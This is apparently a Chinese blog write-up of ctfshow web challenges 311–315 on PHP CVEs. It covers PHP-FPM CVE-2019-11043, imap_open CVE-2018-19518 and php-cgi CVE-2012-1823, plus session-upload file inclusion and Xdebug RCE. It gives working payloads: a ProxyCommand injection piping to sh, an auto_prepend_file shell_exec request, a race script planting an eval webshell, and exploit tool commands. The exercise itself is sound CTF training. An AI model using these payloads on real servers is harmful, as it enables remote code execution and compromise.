---
title: ctfshow web入门(phpcve)
categories: ctfshow
---
# 311 (CVE-2019-11043)

[cev-2019-11043](https://cloud.tencent.com/developer/article/1530703)

影响范围：

在 `Nginx + PHP-FPM` 环境下，当启用了特定的 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：
- PHP 7.0 版本
- PHP 7.1 版本
- PHP 7.2 版本
-	PHP 7.3 版本

<!--more-->
PHP-FPM是什么？

https://zhuanlan.zhihu.com/p/110540192

抓包：

![](https://img-blog.csdnimg.cn/20210415231333637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
搜索：

![](https://img-blog.csdnimg.cn/20210415231352766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
成因：

该漏洞需要在 `nginx.conf` 中进行`特定配置`才能触发。具体配置如下：
```php
location ~ [^/]\.php(/|$) {

 ...

 fastcgi_split_path_info ^(.+?\.php)(/.*)$;

 fastcgi_param PATH_INFO $fastcgi_path_info;

 fastcgi_pass   php:9000;

 ...

}
```

攻击者可以使用换行符（％0a）来破坏`fastcgi_split_path_info 指令中的Regexp`。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。

payload:

工具利用：

>git clone https://github.com/neex/phuip-fpizdam.git

查看go环境信息

![](https://img-blog.csdnimg.cn/2021041523194060.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
获取 $GOPATH

```
$GOPATH是go安装的目录，记得改成自己的

mkdir -p $GOPATH/src/golang.org/x/

cd $GOPATH/src/golang.org/x/

git clone https://github.com/neex/phuip-fpizdam.git phuip-fpizdam

go install phuip-fpizdam
```

![](https://img-blog.csdnimg.cn/20210415232009545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
缺啥下载啥

完成后 `bin目录`下生成可执行

![](https://img-blog.csdnimg.cn/20210415232021937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
执行payload：

```
./phuip-fpizdam url/index.php
```

![](https://img-blog.csdnimg.cn/20210415232123919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
`index.php?a=ls` 执行系统命令


---
# 312(CVE-2018-19518)-PHP-IMAP
[PHP imap 远程命令执行漏洞](https://blog.csdn.net/lhh134/article/details/88542587)

>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。
因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。


影响：
- PHP：5.6.38
系统：Debian/ubuntu
条件较高


抓包大概长这样：

![](https://img-blog.csdnimg.cn/20210415232336823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

修改命令发包：

```html
POST / HTTP/1.1
Host: c5b5673c-8fb8-41dd-be39-b18fb4ab90b1.challenge.ctf.show:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Origin: http://c5b5673c-8fb8-41dd-be39-b18fb4ab90b1.challenge.ctf.show:8080
Connection: close
Referer: http://c5b5673c-8fb8-41dd-be39-b18fb4ab90b1.challenge.ctf.show:8080/
Upgrade-Insecure-Requests: 1

hostname=x+-oProxyCommand%3decho%09(要执行命令的base64)|base64%09-d|sh}a&username=admin&password=admin
```

---
# 313(CVE-2012-1823)-PHP-CGI
[CVE-2012-1823](https://www.freebuf.com/articles/web/213647.html)

>这个漏洞简单来说，就是用户请求的querystring（querystring字面上的意思就是查询字符串，一般是对http请求所带的数据进行解析，这里也是只http请求中所带的数据）被作为了php-cgi的参数，最终导致了一系列结果。



漏洞影响版本 :
- php < 5.3.12 
-  php < 5.4.2

漏洞利用
       
>cgi 模式下有如下可控命令行参数可用：
```
  -c 指定php.ini文件（PHP的配置文件）的位置
  -n 不要加载php.ini文件
  -d 指定配置项
  -b 启动fastcgi进程
  -s 显示文件源码
  -T 执行指定次该文件
  -h和-? 显示帮助
```

测试：

-s显示源码

![](https://img-blog.csdnimg.cn/20210415233235531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Payload：

```
POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input

<?php echo shell_exec("cat /somewhere/fla9.txt"); ?>
```
![](https://img-blog.csdnimg.cn/20210415233341569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 314(PHP_SESSION_UPLOAD_PROGRESS文件包含)

Php版本为7.3.22，说了不算是cve，而且把 : ban了

有个include，尝试日志包含
路径：/var/log/nginx/access.log

![](https://img-blog.csdnimg.cn/2021041523344524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

试了几次不让我进了

/phpinfo.php

![](https://img-blog.csdnimg.cn/20210415233502335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现可以session上传文件：

```python
# coding=utf-8
import io
import requests
import threading

sessid = 'flag'
data = {"cmd": "system('ls');"}
url = "http://7def2caa-fc1b-45ac-97a9-c35b7e95629d.challenge.ctf.show:8080/"

def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post(url,
                            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'},
                            files={'file': ('tgao.txt', f)}, cookies={'PHPSESSID': sessid})


def read(session):
    while True:
        resp = session.post(url+'?f=/tmp/sess_' + sessid,
                            data=data)
        if 'tgao.txt' in resp.text:
            print(resp.text)
            event.clear()
        else:
            pass


if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 30):
            threading.Thread(target=read, args=(session,)).start()
    event.set()
```

---
# 315
需要服务器，回头写


[XDebug的攻击面](https://blog.spoock.com/2017/09/19/xdebug-attack-surface/)

[github地址](https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce)


![](https://img-blog.csdnimg.cn/20210418120104402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)

在DBGp中存在一些可以危险的命令，如果开启了回连，就有可能导致这些命令能够被执行。这些危险的命令包括：

- Core Commands > source
source可以读取文件，使用方式是source -i transaction_id -f fileURI。transaction_id 貌似没有那么硬性的要求，每次都为 1 即可，fileURI 是要读取的文件的路径。需要注意的是，Xdebug也受限于 open_basedir

- Extended Commands > eval
eval的用法与php中的eval用法相同，使用方式是eval -i transaction_id -- {DATA},其中{DATA} 为 base64 过的 PHP 代码
- Extended Commands > interact - Interactive Shell
Xdebug并没有实现
- Core Commands > property_set

![](https://img-blog.csdnimg.cn/20210418122538752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


>python3 exp.py -t url/index.php -c 'shell_exec('id');'
